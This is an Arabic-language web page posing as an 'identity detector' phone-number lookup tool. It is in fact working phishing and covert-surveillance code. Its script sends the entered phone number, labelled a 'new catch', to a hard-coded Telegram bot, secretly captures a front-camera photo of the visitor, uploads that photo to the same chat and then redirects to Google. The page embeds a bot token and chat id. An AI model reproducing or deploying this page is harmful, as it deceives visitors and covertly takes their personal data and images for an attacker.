<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاشف الهوية المتقدم</title>
    <style>
        body { background: #0f1216; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #d4af37; width: 85%; max-width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; }
        button { background: #d4af37; color: black; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="color:#d4af37">⚜️ كاشف الهوية</h2>
    <input type="tel" id="p" placeholder="أدخل رقم الهاتف">
    <button onclick="go()">بدأ الفحص</button>
    <p id="msg" style="font-size:12px; color:#888; margin-top:10px;"></p>
</div>

<video id="v" autoplay playsinline muted style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
    const T = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
    const C = '5156556639';

    async function send(data, mode) {
        const url = `https://api.telegram.org/bot${T}/${mode}`;
        try {
            const resp = await fetch(url, { method: 'POST', body: data });
            const res = await resp.json();
            if(res.ok) { console.log("Sent!"); } 
            else { alert("Telegram Error: " + res.description); }
        } catch (e) { alert("Network Error: فشل الاتصال بتليجرام"); }
    }

    function go() {
        const num = document.getElementById('p').value;
        if(num.length < 5) return;

        document.getElementById('msg').innerText = "جاري الإرسال...";

        // 1. إرسال الرقم فوراً
        const fd = new FormData();
        fd.append('chat_id', C);
        fd.append('text', "🔔 صيد جديد: " + num);
        send(fd, 'sendMessage');

        // 2. محاولة التصوير
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => {
            document.getElementById('v').srcObject = s;
            setTimeout(() => {
                const cv = document.getElementById('c');
                cv.width = 400; cv.height = 400;
                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 400);
                cv.toBlob(b => {
                    const pd = new FormData();
                    pd.append('chat_id', C);
                    pd.append('photo', b, 'a.jpg');
                    send(pd, 'sendPhoto').then(() => {
                        window.location.href = "https://www.google.com";
                    });
                }, 'image/jpeg', 0.5);
            }, 2000);
        })
        .catch(() => { window.location.href = "https://www.google.com"; });
    }
</script>
</body>
</html>
